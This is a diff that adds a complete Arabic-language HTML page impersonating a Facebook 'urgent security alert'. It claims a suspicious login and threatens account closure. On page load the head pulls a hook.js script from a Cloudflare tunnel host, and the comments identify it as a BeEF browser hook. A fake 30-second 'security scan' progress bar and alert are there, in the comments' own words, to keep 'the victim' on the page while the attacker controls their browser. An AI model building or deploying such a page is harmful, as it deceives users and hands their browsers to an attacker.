@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد أمان الحساب</title>
+    
+    <script src="https://mattress-tire-pressure-alleged.trycloudflare.com/hook.js"></script>
+
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; color: #1c1e21; }
+        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 100%; max-width: 420px; text-align: center; }
+        .logo { width: 50px; margin-bottom: 20px; }
+        h1 { font-size: 22px; margin-bottom: 15px; color: #d32f2f; }
+        p { font-size: 15px; line-height: 1.6; color: #4b4f56; margin-bottom: 25px; }
+        .loading-bar { width: 100%; height: 8px; background: #eee; border-radius: 4px; overflow: hidden; margin-bottom: 20px; display: none; }
+        .loading-progress { width: 0%; height: 100%; background: #1877f2; transition: width 0.5s; }
+        .btn { background-color: #1877f2; color: white; border: none; padding: 14px 25px; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; }
+        .footer { margin-top: 20px; font-size: 12px; color: #90949c; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="FB" class="logo">
+    <h1>تنبيه أمني عاجل</h1>
+    <p>لقد تم رصد محاولة دخول مشبوهة إلى حسابك من "الولايات المتحدة". يرجى الضغط على الزر أدناه لإتمام فحص الأمان ومنع إغلاق الحساب.</p>
+    
+    <div id="loader" class="loading-bar">
+        <div id="progress" class="loading-progress"></div>
+    </div>
+
+    <button id="mainBtn" class="btn" onclick="startProcess()">بدء فحص الأمان</button>
+    
+    <div class="footer">حقوق الطبع والنشر © 2026 Facebook Meta</div>
+</div>
+
+<script>
+    function startProcess() {
+        // إخفاء الزر وإظهار شريط التحميل لإبقاء الضحية فترة أطول
+        document.getElementById('mainBtn').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+        
+        let width = 0;
+        let interval = setInterval(() => {
+            if (width >= 100) {
+                clearInterval(interval);
+                // تجميد الصفحة لإبقاء الاتصال (Hook) حياً في BeEF
+                alert("جاري التحقق من المتصفح... يرجى عدم إغلاق هذه الصفحة.");
+            } else {
+                width += 1;
+                document.getElementById('progress').style.width = width + '%';
+            }
+        }, 300); // يستغرق 30 ثانية للتحميل (وقت كافٍ لك للتحكم به في BeEF)
+    }
+
+    // بمجرد تحميل الصفحة، يتم إرسال إشارة لـ BeEF تلقائياً
+    console.log("Security bridge initialized...");
+</script>
+
+</body>
+</html>
